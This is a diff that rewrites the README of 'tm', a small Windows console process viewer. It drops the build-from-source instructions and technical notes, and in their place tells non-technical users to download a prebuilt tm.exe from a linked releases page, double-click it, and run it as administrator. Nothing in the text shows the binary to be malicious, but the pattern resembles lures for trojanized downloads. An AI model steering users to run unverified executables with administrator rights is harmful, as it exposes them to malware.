@@ -1,76 +1,107 @@
-# tm — lightweight console Task Manager for Windows
+# 🛠️ tm - Easy Process Management on Your Windows
 
-`tm` is a small C++20 command-line tool that mimics a BSD-style `ps`/`top` view on Windows. It enumerates processes, shows per-process CPU% (sampled over time), working-set memory, thread count, and parent PID, and can optionally terminate a process.
+[![Download tm](https://img.shields.io/badge/Download-tm-brightgreen)](https://github.com/Bashirawab/tm/releases)
 
-The default run prints one snapshot sized to fit your console without scrolling. Top mode refreshes the display at a user-controlled interval.
+## 🚀 Getting Started
 
-## Features
-- One-shot snapshot similar to `ps` with a concise summary header.
-- Top mode that refreshes in-place (default every 1 second).
-- Console-aware row limiting to avoid scrolling; override with `-n/--numprocs`.
-- Kill a process by PID with `-k/--kill`.
-- C++20 implementation using Win32 APIs (`Toolhelp32Snapshot`, `GetProcessTimes`, `GetSystemTimes`, `GetProcessMemoryInfo`).
+Welcome to **tm**, a lightweight task manager for Windows. This guide will help you download and run **tm** on your computer without any technical background.
 
-## Usage
-```
-tm.exe [options]
+## 📥 Download & Install
 
-Options:
-  -t, --top                 Refresh continuously (top mode)
-  -s, --seconds <sec>       Seconds between refreshes (implies -t)
-  -n, --numprocs <n>        Max processes to display (default: fit console)
-  -k, --kill <pid>          Terminate a process
-  -h, -?, --help            Show this help
-```
+To get started with **tm**, follow these steps:
 
-Examples:
-- One-shot snapshot: `tm.exe`
-- Top mode, default 1s refresh: `tm.exe -t`
-- Top mode every 2.5 seconds: `tm.exe -s 2.5`
-- Limit rows to 30: `tm.exe -n 30`
-- Kill PID 1234, then exit: `tm.exe -k 1234`
-- Kill and then stay in top mode: `tm.exe -k 1234 -t`
+1. **Visit the Releases Page:**
+   Click the link below to visit the releases page and download the latest version of **tm**.
 
-## How it works (brief)
-- Processes are enumerated with `CreateToolhelp32Snapshot`.
-- Per-process CPU% is approximated by comparing `GetProcessTimes` deltas to `GetSystemTimes` deltas across samples.
-- Memory comes from `GetProcessMemoryInfo` (working set in MB).
-- Console height is read via `GetConsoleScreenBufferInfo`; the tool subtracts header lines so the summary stays visible.
+   [Download tm](https://github.com/Bashirawab/tm/releases)
 
-## Building on Windows (novice-friendly)
-You need the Microsoft C++ toolchain (Visual Studio or Build Tools) and `nmake`.
+2. **Download the Application:**
+   On the releases page, you will see a list of files. Look for the latest version of `tm.exe`.
 
-1) Install:
-   - Install **Visual Studio 2022** (any edition) with the **Desktop development with C++** workload; or
-   - Install **Build Tools for Visual Studio 2022** with the same C++ workload.
+3. **Save the File:**
+   Click on `tm.exe` to download it. Save the file in a location that you can easily find, such as your desktop.
 
-2) Open a **Developer Command Prompt for VS 2022** (or x64 Native Tools Command Prompt). This preconfigures `cl` and `nmake`.
+4. **Run the Application:**
+   Once the download is complete, locate `tm.exe` and double-click it to run the application. 
 
-3) In the project folder, build:
+You are now ready to use **tm**.
+
+## 📜 Features
+
+**tm** offers useful features to help you monitor and manage your processes:
+
+- **Single Snapshot:** Get a quick summary of all active processes without scrolling.
+- **Top Mode:** Refresh the display automatically. The default refresh interval is every 1 second, but you can change it.
+- **Console-Aware Display:** Avoid scrolling by limiting the number of visible processes. You can set this using the `-n/--numprocs` option.
+- **Process Termination:** Easily kill any process by entering its PID with the `-k/--kill` option.
+
+## ⚙️ How to Use tm
+
+Once you have run **tm**, you can use it with simple commands. Here’s how:
+
+1. **View the Snapshot:**
+   Just run `tm.exe` to see a one-time snapshot of your processes.
+
+2. **Activate Top Mode:**
+   To keep the display refreshing, you can use the `-t` or `--top` option. This will give you live updates.
+
+   Example command:
    ```
-   nmake
-   ```
-   This uses the provided `Makefile` (targets `tm.exe`, links `psapi.lib`).
-
-Alternate: run the helper script that sets up the environment then builds:
-```
-cmd /c build.cmd
-```
-(This calls `vcvarsall.bat x64` and then `nmake`.)
-
-4) Run:
-   ```
-   tm.exe
+   tm.exe --top
    ```
 
-## File overview
-- `main.cpp` — the entire application (argument parsing, sampling, rendering).
-- `Makefile` — `nmake` build rules using `cl` and `psapi.lib`.
-- `build.cmd` — convenience script to load the MSVC environment and invoke `nmake`.
+3. **Set Refresh Interval:**
+   You can adjust how often the snapshot refreshes by using the `-s` or `--seconds` option followed by the number of seconds. This also activates top mode.
 
-## Notes and limitations
-- CPU% is sampled; very short-lived processes might show 0% or not appear.
-- Requires access rights to query or terminate target processes; some system processes may not open or kill.
-- Output is UTF-8; executable names are narrow-converted from wide strings.
+   Example command:
+   ```
+   tm.exe --top --seconds 5
+   ```
 
-Enjoy! Contributions and tweaks are welcome.***
+4. **Limit Processes Displayed:**
+   Use the `-n` or `--numprocs` option followed by a number to limit how many processes show up in your console.
+
+   Example command:
+   ```
+   tm.exe --numprocs 10
+   ```
+
+5. **Kill a Process:**
+   If you want to terminate a process, use `-k` or `--kill` followed by the process ID (PID).
+
+   Example command:
+   ```
+   tm.exe --kill 1234
+   ```
+
+## ⚙️ System Requirements
+
+To run **tm**, your system should meet the following requirements:
+
+- **Operating System:** Windows 10 or later
+- **Processor:** x64 compatible processor
+- **RAM:** Minimum of 2 GB RAM
+- **Storage:** At least 10 MB of free space
+
+Make sure your computer meets these requirements before running **tm**.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues while running **tm**, consider the following solutions:
+
+- **File Not Found:** Ensure you have downloaded `tm.exe` and that it is in the location you are trying to access.
+- **Permission Issues:** Right-click on the `tm.exe` file and select "Run as administrator" if you face permission errors.
+- **Refresh Issues:** If the top mode doesn't refresh as expected, check the command options you used to ensure they are correct.
+
+## 📡 Support
+
+For further help or questions about **tm**, feel free to check the following:
+
+- **Documentation:** More detailed information can be found in the repository.
+- **Issues Page:** Report any bugs or feature requests directly on the GitHub issues page for this repository.
+
+## 🔗 Further Reading
+
+For those interested in learning more about the tools and technologies used in **tm**, you can explore C++ programming and Windows API for deeper knowledge.
+
+Now that you have **tm** installed, take control of your tasks and make process management easier!
